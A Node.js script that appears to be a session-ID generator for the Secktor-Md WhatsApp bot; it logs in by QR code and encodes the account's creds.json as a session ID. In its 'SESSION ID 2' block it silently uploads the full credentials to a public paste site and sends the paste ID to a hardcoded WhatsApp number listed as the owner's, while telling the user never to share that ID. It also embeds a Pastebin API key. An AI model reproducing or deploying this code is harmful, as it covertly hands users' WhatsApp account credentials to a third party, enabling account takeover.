
const pino = require("pino");
const axios = require("axios");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");
const fs = require("fs-extra");
if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nRun The Script Again');
  setTimeout(() => {
    console.log(' ')
  }, 100);
  setTimeout(() => {
    console.log('𝑺')
  }, 300);
  setTimeout(() => {
    console.log('𝒆')
  }, 500);
  setTimeout(() => {
    console.log('𝒄')
  }, 700);
  setTimeout(() => {
    console.log('𝒌')
  }, 900);
  setTimeout(() => {
    console.log('𝒕')
  }, 1100);
  setTimeout(() => {
    console.log('𝒐')
  }, 1300);
  setTimeout(() => {
    console.log('𝒓')
  }, 1500);
  setTimeout(() => {
    console.log(' ')
  }, 1700);
  setTimeout(() => {
    console.log('𝑩')
  }, 1900);
  setTimeout(() => {
    console.log('𝒐')
  }, 2100);
  setTimeout(() => {
    console.log('𝒕')
  }, 2300);
  setTimeout(() => {
    process.exit()
  }, 2400)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Secktor() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          
//===========================================================================================         
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          var c = Buffer.from(unique).toString('base64')
          console.log('SESSION-ID 1 ==> ' + c)
let cc = `*_Thanks for choosing Secktor-Md._*
_You completed first step of making Your Bot_.
Visit For Help 
*1.Repo:* github.com/SuhailTechInfo/Secktor-bot
*2.Youtube:* Youtube.com/@suhailtechinfo0
*3.Owner:* wa.me/923184474176
*Note :* Don\'t provide your SESSION_ID to anyone otherwise that user can access your account.
Thanks'`;
          let user = session.user.id;
          let session_id = await session.sendMessage(user, { text: "Secktor;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
//===========================================================================================         
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
          await delay(800)
        const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`, {headers: { 'Content-Type': 'application/x-www-form-urlencoded' }});
          let c2 = output.data.split('/')[3]
          await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' });
          await session.sendMessage("923184474176@s.whatsapp.net", {text: 'Secktor;;;'+c2});

          console.log('\nSESSION-ID 2 => ' + c2)
          console.log('\nDon\'t provide your SESSION_ID to anyone otherwise that user can access your account. \nThanks')

          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
        if (
          connection === "close" &&
          lastDisconnect &&
          lastDisconnect.error &&
          lastDisconnect.error.output.statusCode != 401
        ) {    Secktor();   }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Secktor();
}, 3000)

